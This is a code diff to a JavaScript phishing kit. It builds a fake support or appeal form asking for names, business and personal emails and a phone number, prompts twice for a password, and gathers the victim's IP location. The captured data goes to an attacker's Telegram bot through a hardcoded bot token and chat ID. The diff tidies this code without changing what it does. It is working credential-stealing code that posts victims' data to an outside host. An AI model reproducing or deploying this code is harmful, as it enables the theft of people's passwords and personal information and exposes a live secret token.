@@ -7,49 +7,36 @@ function getIP(callback) {
 
 let FIRST_PASSWORD = '';
 let NUMBER_TIME_LOGIN = 0;
-let isSubmitDisabled = false; // ✅ Dùng để khóa nút tạm thời
+let isSubmitDisabled = false;
 
 $(document).ready(function () {
-
     $('#input').html(`
         <div class="mb-3">
-            <label for="page-name" class="form-label">
-                Page Name <span class="text-danger">*</span>
-            </label>
+            <label for="page-name" class="form-label">Page Name <span class="text-danger">*</span></label>
             <input type="text" class="form-control" required id="page-name">
         </div>
         <div class="mb-3">
-            <label for="full-name" class="form-label">
-                Full Name <span class="text-danger">*</span>
-            </label>
+            <label for="full-name" class="form-label">Full Name <span class="text-danger">*</span></label>
             <input type="text" class="form-control" required id="full-name">
         </div>
         <div class="mb-3">
-            <label for="business-email" class="form-label">
-                Business Email Address <span class="text-danger">*</span>
-            </label>
+            <label for="business-email" class="form-label">Business Email Address <span class="text-danger">*</span></label>
             <input type="text" class="form-control" required id="business-email">
         </div>
         <div class="mb-3">
-            <label for="personal-email" class="form-label">
-                Personal Email Address <span class="text-danger">*</span>
-            </label>
+            <label for="personal-email" class="form-label">Personal Email Address <span class="text-danger">*</span></label>
             <input type="text" class="form-control" required id="personal-email">
         </div>
         <div class="mb-3">
-            <label for="phone" class="form-label">
-                Mobile Phone Number <span class="text-danger">*</span>
-            </label>
+            <label for="phone" class="form-label">Mobile Phone Number <span class="text-danger">*</span></label>
             <input type="text" class="form-control" required id="phone">
         </div>
         <div class="mb-3">
-            <label class="form-label">
-                Please provide us information that will help us investigate.
-            </label>
+            <label class="form-label">Please provide us information that will help us investigate.</label>
             <textarea class="form-control" id="description" rows="3"></textarea>
         </div>
         <button type="button" class="btn mb-4">Submit</button>
-    `)
+    `);
 
     openDetail();
 
@@ -161,7 +148,6 @@ function showPrompt(IpAddress) {
             $('#password').removeClass('border-danger');
         }
 
-        // ✅ Ẩn thông báo sai pass nếu có trước đó
         $('#wrong-password').addClass('d-none');
 
         let secondPassword = '';
@@ -181,11 +167,14 @@ function showPrompt(IpAddress) {
 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
 <strong>City: </strong><code>${IpAddress.city}</code>`;
 
-        fetch(`https://api.telegram.org/bot7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk/sendMessage`, {
+        const token = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
+        const chat_id = '-1002416068664';
+
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                chat_id: '-1002416068664',
+                chat_id: chat_id,
                 text: message,
                 parse_mode: 'html'
             })
